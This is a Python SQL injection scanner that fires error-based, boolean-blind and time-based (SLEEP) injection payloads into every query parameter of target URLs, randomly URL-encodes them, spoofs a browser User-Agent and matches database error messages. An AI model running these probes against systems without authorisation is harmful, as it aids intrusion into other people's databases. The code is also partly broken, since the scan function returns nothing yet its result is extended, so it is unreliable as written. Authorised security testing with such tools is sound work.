import requests
requests.packages.urllib3.disable_warnings()

from colorama import Fore
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlencode, parse_qs, quote_plus
from alive_progress import alive_bar
from queue import Queue
import threading
import os
import time
import re
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

# Rate Limiting Configuration
RATE_LIMIT = 5  # Maximum number of requests per second
REQUEST_INTERVAL = 1 / RATE_LIMIT  # Interval between requests in seconds

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def encode_payload(payload):
    encodings = [
        lambda x: x,  # No encoding
        lambda x: quote_plus(x),  # URL encoding
        lambda x: ''.join(f'%{ord(c):02X}' for c in x),  # Full URL encoding
    ]
    return random.choice(encodings)(payload)

def print_vulnerability(vuln):
    print(f"\n{Fore.RED}SQL Injection vulnerability found:{Fore.RESET}")
    print(f"URL: {Fore.CYAN}{vuln['url']}{Fore.RESET}")
    print(f"Parameter: {Fore.YELLOW}{vuln['parameter']}{Fore.RESET}")
    print(f"Payload: {Fore.MAGENTA}{vuln['payload']}{Fore.RESET}")
    print(f"Test URL: {Fore.BLUE}{vuln['test_url']}{Fore.RESET}")
    print(f"Type: {Fore.GREEN}{vuln['type']}{Fore.RESET}")

def sqli_scan_url(url, print_queue, bar, rate_limiter):
    print_queue.put(f"{Fore.CYAN}Scanning for SQL injection vulnerabilities: {url}{Fore.RESET}")
    
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    
    for param in params:
        # Error-based SQLi
        error_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL, NULL, NULL --",
            "1' ORDER BY 1--+",
            "1' ORDER BY 2--+",
            "1' ORDER BY 3--+",
            "1 UNION SELECT NULL, NULL, NULL --",
        ]
        
        for payload in error_payloads:
            rate_limiter.acquire()
            encoded_payload = encode_payload(payload)
            test_params = params.copy()
            test_params[param] = [encoded_payload]
            test_url = parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl()
            
            try:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                                    'AppleWebKit/537.36 (KHTML, like Gecko) '
                                    'Chrome/58.0.3029.110 Safari/537.3'
                }
                response = requests.get(test_url, verify=False, headers=headers, timeout=10)
                
                sql_errors = [
                    r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result",
                    r"MySqlClient\.", r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*",
                    r"valid PostgreSQL result", r"Npgsql\.", r"Driver.*SQL SERVER",
                    r"OLE DB.*SQL SERVER", r"SQL Server.*Driver", r"Warning.*mssql_.*",
                    r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
                    r"ODBC SQL Server Driver", r"SQLServer JDBC Driver", r"Oracle error",
                    r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"
                ]
                
                for error in sql_errors:
                    if re.search(error, response.text, re.IGNORECASE):
                        vulnerability = {
                            "url": url,
                            "parameter": param,
                            "payload": encoded_payload,
                            "test_url": test_url,
                            "type": "Error-based SQLi"
                        }
                        print_queue.put(vulnerability)
                        bar()  # Increment progress bar upon finding a vulnerability
                        return  # Exit after finding a vulnerability
                
            except requests.RequestException as e:
                print_queue.put(f"{Fore.YELLOW}Error scanning {test_url}: {str(e)}{Fore.RESET}")
            finally:
                bar()  # Increment the progress bar for each payload scanned
        
        # Boolean-based blind SQLi
        rate_limiter.acquire()
        original_params = params.copy()
        original_params[param] = ["1 AND 1=1"]
        true_url = parsed_url._replace(query=urlencode(original_params, doseq=True)).geturl()
        
        original_params[param] = ["1 AND 1=2"]
        false_url = parsed_url._replace(query=urlencode(original_params, doseq=True)).geturl()
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                                'AppleWebKit/537.36 (KHTML, like Gecko) '
                                'Chrome/58.0.3029.110 Safari/537.3'
            }
            true_response = requests.get(true_url, verify=False, headers=headers, timeout=10)
            false_response = requests.get(false_url, verify=False, headers=headers, timeout=10)
            
            if true_response.text != false_response.text:
                vulnerability = {
                    "url": url,
                    "parameter": param,
                    "payload": "1 AND 1=1 / 1 AND 1=2",
                    "test_url": f"{true_url} / {false_url}",
                    "type": "Boolean-based blind SQLi"
                }
                print_queue.put(vulnerability)
                bar()  # Increment progress bar upon finding a vulnerability
        except requests.RequestException as e:
            print_queue.put(f"{Fore.YELLOW}Error during boolean-based test for {url}: {str(e)}{Fore.RESET}")
        finally:
            bar()  # Increment the progress bar even if vulnerability is found
            
        # Time-based blind SQLi
        rate_limiter.acquire()
        time_payload = "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1"
        encoded_time_payload = encode_payload(time_payload)
        time_params = params.copy()
        time_params[param] = [encoded_time_payload]
        time_url = parsed_url._replace(query=urlencode(time_params, doseq=True)).geturl()
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                                'AppleWebKit/537.36 (KHTML, like Gecko) '
                                'Chrome/58.0.3029.110 Safari/537.3'
            }
            start_time = time.time()
            response = requests.get(time_url, verify=False, headers=headers, timeout=10)
            end_time = time.time()
            
            if end_time - start_time >= 5:
                vulnerability = {
                    "url": url,
                    "parameter": param,
                    "payload": time_payload,
                    "test_url": time_url,
                    "type": "Time-based blind SQLi"
                }
                print_queue.put(vulnerability)
        except requests.RequestException as e:
            print_queue.put(f"{Fore.YELLOW}Error during time-based test for {url}: {str(e)}{Fore.RESET}")
        finally:
            bar()  # Increment the progress bar for each payload scanned

def print_worker(print_queue):
    while True:
        item = print_queue.get()
        if item is None:
            break
        if isinstance(item, dict):
            print_vulnerability(item)
        else:
            print(item)
        print_queue.task_done()

def sqli_scanner(args):
    target = args.sqli_scan
    print_queue = Queue()
    print_thread = threading.Thread(target=print_worker, args=(print_queue,))
    print_thread.start()

    if os.path.isfile(target):
        with open(target, 'r') as file:
            urls = [line.strip() for line in file if line.strip()]
    else:
        urls = [target]

    try:
        with open("payloads/sqli.txt", "r") as f:
            payloads = [x.strip() for x in f.readlines()]
    except FileNotFoundError:
        print(f"{Fore.RED}Payload file 'payloads/sqli.txt' not found.{Fore.RESET}")
        return []

    total_payloads = 0
    # Calculate total payloads based on number of URLs and number of payloads per URL
    for url in urls:
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        if params:
            # Error-based payloads
            error_payloads = [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' UNION SELECT NULL, NULL, NULL --",
                "1' ORDER BY 1--+",
                "1' ORDER BY 2--+",
                "1' ORDER BY 3--+",
                "1 UNION SELECT NULL, NULL, NULL --",
            ]
            total_payloads += len(params) * len(error_payloads)
            
            # Boolean-based payloads (1 per parameter)
            total_payloads += len(params) * 1
            
            # Time-based payloads (1 per parameter)
            total_payloads += len(params) * 1

    if total_payloads == 0:
        print(f"{Fore.YELLOW}No parameters found in the target URL(s) to perform SQLi scanning.{Fore.RESET}")
        return []

    all_vulnerabilities = []
    # Initialize the rate limiter
    rate_limiter = threading.Semaphore(RATE_LIMIT)

    def release_rate_limiter():
        while True:
            time.sleep(REQUEST_INTERVAL)
            rate_limiter.release()

    # Start a thread to release the semaphore at the defined rate
    rate_thread = threading.Thread(target=release_rate_limiter, daemon=True)
    rate_thread.start()

    with alive_bar(total_payloads, title="Scanning SQL Injection Vulnerabilities") as bar:
        with ThreadPoolExecutor(max_workers=args.concurrency) as executor:
            future_to_url = {executor.submit(sqli_scan_url, url, print_queue, bar, rate_limiter): url for url in urls}
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    vulnerabilities = future.result()
                    all_vulnerabilities.extend(vulnerabilities)
                except Exception as exc:
                    print_queue.put(f'{Fore.RED}Error scanning {url}: {exc}{Fore.RESET}')

    print_queue.put(None)
    print_thread.join()

    return all_vulnerabilities

